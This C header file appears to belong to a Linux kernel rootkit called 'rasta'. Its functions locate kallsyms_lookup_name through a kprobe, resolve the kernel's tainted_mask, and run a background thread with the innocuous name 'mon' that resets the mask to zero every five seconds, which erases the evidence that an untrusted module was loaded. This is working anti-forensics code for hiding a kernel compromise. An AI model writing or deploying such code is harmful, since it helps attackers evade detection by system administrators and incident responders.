#ifndef TAINT_MASK_H
#define TAINT_MASK_H

#define RESET_THREAD_NAME "mon"

static struct task_struct *clean_thread = NULL;
static unsigned long *taint_mask_ptr = NULL;

static struct kprobe probe_lookup = {
    .symbol_name = "kallsyms_lookup_name"
};

static unsigned long *get_taint_mask_addr(void) {
    typedef unsigned long (*lookup_name_fn)(const char *name);

    lookup_name_fn kallsyms_lookup_fn;

    unsigned long *taint_addr = NULL;

    if (register_kprobe(&probe_lookup) < 0) {
        printk(KERN_ERR "rasta : Failed to register kprobe\n");
        return NULL;
    }

    kallsyms_lookup_fn = (lookup_name_fn) probe_lookup.addr;
    unregister_kprobe(&probe_lookup);

    if (kallsyms_lookup_fn) {
        taint_addr = (unsigned long *)kallsyms_lookup_fn("tainted_mask");

        if (taint_addr) {
            printk(KERN_INFO "rasta : tainted_mask address: %px\n", taint_addr);
        }
    }
    return taint_addr;
}

static void reset_taint_mask(void) {
    if (taint_mask_ptr && *taint_mask_ptr != 0) {
        printk(KERN_INFO "rasta : tainted_mask before reset: %lu\n", *taint_mask_ptr);

        *taint_mask_ptr = 0;

        printk(KERN_INFO "rasta : tainted_mask reset to: %lu\n", *taint_mask_ptr);
    } 
}

static int my_thread(void *data) {
    while (!kthread_should_stop()) {
        reset_taint_mask();
        ssleep(5);
    }
    return 0;
}


#endif